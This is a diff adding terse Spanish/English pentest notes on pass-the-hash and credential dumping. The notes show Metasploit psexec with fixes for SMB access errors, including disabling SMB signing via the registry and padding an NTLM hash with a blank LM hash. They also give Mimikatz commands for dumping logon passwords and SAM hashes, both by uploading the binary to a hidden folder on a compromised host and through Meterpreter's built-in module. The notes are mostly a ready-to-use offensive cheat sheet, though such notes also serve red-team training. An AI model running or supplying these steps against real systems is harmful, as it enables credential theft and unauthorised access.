@@ -1,3 +1,22 @@
+Pass the hash
+
+"""""""""""""""""""""""""""""""""""""""""""""""""""psexec"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+Set the options and then exploit......
+>>meterpreter
+
+Error: 
+[-] Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0)
+Solucion:
+“HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” with “RequireSecuritySignature” set to “0”
+Error:
+[-] Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::LoginError Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)
+Solucion: Concatenate the blank LM hash to the NTLM hash
+00000000000000000000000000000000:
+
+
+
+
 Dumping Hashes
 
 """"""""""""""""""""""""""""""""""""""""""""""""""Mimikatz"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
@@ -5,6 +24,31 @@ Dumping Hashes
 >>privilege::debug
 >>sekurlsa::logonpasswords
 ...................muchos hashes y passwords...........
+
+Se puede usar mimikatz como post/exploitation desde metasploit
+
+Opcion 1)
+Cargar mimikatz al sistema comprometido
+>>meterpreter>> upload /home/mimikatz.exe c:\\AlgunLugarEscondido
+>>meterpreter>> shell
+C: > cd AlgunlLugarEscondido
+c:\AlgunLugarEscondido > mimikatz.exe
+
+To run mimikatz you well need mimikatz.exe and sekurlsa.dll on the system you're targeting. 
+privilege::debug
+inject::process lsass.exe sekurlsa.dll
+getLogonPasswords
+sekurlsa::logonpasswords full
+
+Opcion 2) Use the mimikatz build-in on metasploit
+
+>>meterpreter>>load mimikatz
+>>meterpreter>>msv
+>>meterpreter>>mimikatz_command -f samdump::hashes
+
+
+
+
 
 
 
